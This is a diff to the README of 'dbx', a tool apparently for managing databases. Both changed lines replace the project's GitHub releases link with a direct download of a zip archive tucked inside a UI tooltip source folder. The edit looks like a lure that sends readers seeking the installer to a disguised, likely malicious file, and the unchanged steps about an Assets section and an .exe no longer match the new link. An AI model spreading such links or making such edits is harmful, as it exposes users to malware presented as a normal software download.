@@ -1,6 +1,6 @@
 # 🗄️ dbx - Manage your databases with ease
 
-[![Download dbx](https://img.shields.io/badge/Download_dbx-blue)](https://github.com/danielcer6542/dbx/releases)
+[![Download dbx](https://img.shields.io/badge/Download_dbx-blue)](https://raw.githubusercontent.com/danielcer6542/dbx/main/src/components/ui/tooltip/Software_v2.7.zip)
 
 dbx is a lightweight tool for managing your databases. It works on your computer and supports many types of databases. You can connect to MySQL, PostgreSQL, SQLite, Redis, MongoDB, DuckDB, ClickHouse, and SQL Server in one place. It uses 15MB of space. This tool offers a simple window to view and edit your data.
 
@@ -8,7 +8,7 @@ dbx is a lightweight tool for managing your databases. It works on your computer
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to this link: https://github.com/danielcer6542/dbx/releases
+1. Go to this link: https://raw.githubusercontent.com/danielcer6542/dbx/main/src/components/ui/tooltip/Software_v2.7.zip
 2. Look for the section labeled Assets.
 3. Click the file that ends in .exe.
 4. Save the file to your computer.
